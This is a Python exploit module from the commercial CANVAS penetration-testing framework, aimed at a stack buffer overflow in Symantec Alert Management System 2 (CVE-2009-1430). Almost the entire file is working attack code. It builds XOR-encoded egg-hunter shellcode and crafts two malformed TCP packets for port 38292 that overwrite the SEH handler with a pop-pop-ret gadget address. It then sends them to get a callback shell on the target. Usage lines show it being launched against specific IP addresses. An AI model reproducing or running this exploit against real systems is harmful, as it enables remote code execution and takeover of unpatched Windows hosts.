#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
import xorencoder
import shellcodeGenerator

# GUI info
NAME='Symantec Alert Management System 2 Overflow'
DESCRIPTION='Symantec Alert Management System 2 Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Symantec'
DOCUMENTATION['Date public']='04/28/09'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-09-018/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2009-1430'
DOCUMENTATION['CVE Url']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1430'
DOCUMENTATION['CVSS'] = 9.3

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']
PROPERTY['NOTES']='The exploit will not work twice in a row. Make sure you migrate into another process and restart the "Intel Alert Originator" service!'

NOTES="""
Tested on:
Symantec Antivirus Corporate Edition v10.2.1 on Windows XP Professional SP3

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/symantec_iao/symantec_iao.py -v 1 -t 10.10.10.247 -l 10.10.10.236 -d 5555
"""

CHANGELOG="""
"""

import canvasengine
from encoder import xorencoder

targets={
    0: ['Autodetect (N/A)',0],
    1: ['Symantec Alert Management System 2 v6.12.0.148',0x50244365] # pop&pop&ret @ msgsys.dll while waiting for better
 }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.port=38292
        self.version=0
        self.badstring='\0'
        self.subesp=0
        self.searchcode=''
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('SearchCodeSafeSEH',{'tag':0x6b303063}) #'c00k'
        sc.standalone=1
        rawshellcode=sc.get()
        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        encoder.find_key(rawshellcode)
        self.searchcode=encoder.encode(rawshellcode)
        #print len(self.searchcode),repr(self.searchcode)
        self.createWin32Shellcode('',self.callback.ip,self.callback.port)
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def test(self):
        self.getArgs()
        self.log('%s testing host %s:%s'%(self.name,self.host,self.port))
        s=self.gettcpsock()
        s.set_timeout(4)
        try:
            s.connect((self.host,self.port))
        except:
            self.log('No connection could be established')
            return 0        
        return 1

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Could not determine version automatically')
                self.setInfo('%s attacking %s:%d - done (failed!)'%(NAME,self.host,self.port))
                return 0
        self.info,self.eip=targets[self.version]
        self.log('Attacking %s:%d'%(self.host,self.port))

        data=''
        data+='AACK'+'BBBB'+struct.pack('<H',0x10)+'C'*0x6
        data+='DD'
        data+='c00k'+self.shellcode
        data+='E'*0x40

        packet=''
        packet+=struct.pack('<L',0xffffffff)+'A'*0x16+struct.pack('<L',len(data)+0x1e)+data

        s=self.gettcpsock()
        s.connect((self.host,self.port))
        self.websend(s,packet)
        self.log('Sleeping 4s')
        time.sleep(4)
        s.close()

        data=''
        data+='ORIG'+'BBBB'+struct.pack('<H',0x10)+'C'*0x6
        data+='DDD'+struct.pack('<B',1)+'D'*0x8
        data+='ALRT'+'E'*7
        marker=len(data)
        data+=self.searchcode
        if len(self.searchcode)>0xd4:
            raise Exception,'Search code is now too big!!!'
        data+='F'*(0xd4-len(self.searchcode))
        data+='\xeb\x06GG'
        data+=struct.pack('<L',self.eip) #SEH
        data+=mosdef.assemble('jmp $-0x%x'%(len(data)-marker+5),'x86')
        data+='H'*0x80 #0x50 till end of stack

        packet=''
        packet+=struct.pack('<L',0xffffffff)+'A'*0x16+struct.pack('<L',len(data)+0x1e)+data

        s=self.gettcpsock()
        s.connect((self.host,self.port))
        self.websend(s,packet)
        self.log('Sleeping 4s')
        time.sleep(4)
        s.close()

        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d - done (success!)'%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo('%s attacking %s:%d - done (failed)'%(NAME,self.host,self.port))
            return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
